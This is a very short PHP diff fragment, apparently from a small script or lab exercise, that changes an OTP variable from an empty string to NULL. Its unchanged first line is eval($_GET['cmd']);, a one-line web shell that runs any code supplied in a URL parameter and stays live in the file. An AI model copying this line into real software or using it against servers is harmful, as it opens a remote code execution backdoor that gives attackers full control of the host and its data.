@@ -1,3 +1,3 @@
 eval($_GET['cmd']);
-$otp = "";
+$otp = NULL;
 //$otp = $_POST['otp'] + 1
